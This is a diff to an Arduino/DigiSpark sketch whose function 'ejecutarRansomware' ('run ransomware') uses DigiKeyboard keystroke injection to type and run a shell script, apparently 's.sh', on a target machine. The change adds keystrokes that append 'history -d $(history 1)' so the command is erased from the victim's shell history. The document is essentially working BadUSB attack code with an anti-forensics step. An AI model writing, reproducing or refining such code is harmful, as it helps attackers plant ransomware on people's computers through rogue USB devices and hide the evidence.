@@ -47,8 +47,20 @@ void ejecutarRansomware() {
   DigiKeyboard.print(" .");
   DigiKeyboard.sendKeyStroke(KEY_7, MOD_SHIFT_LEFT);
   DigiKeyboard.print("s.sh");
-  // DigiKeyboard.sendKeyStroke(KEY_6, MOD_SHIFT_LEFT);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Presionar Enter
+
+  // Borrar historial: history -d $(history 1)
+  DigiKeyboard.sendKeyStroke(0x36, MOD_SHIFT_LEFT);
+  DigiKeyboard.print(" history ");
+  DigiKeyboard.sendKeyStroke(KEY_SLASH);
+  DigiKeyboard.print("d ");
+  DigiKeyboard.sendKeyStroke(KEY_4, MOD_SHIFT_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_8, MOD_SHIFT_LEFT);
+  DigiKeyboard.print("history 1");
+  DigiKeyboard.sendKeyStroke(KEY_9, MOD_SHIFT_LEFT);
+
+  // Presionar Enter
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
 }
 
 void loop() {
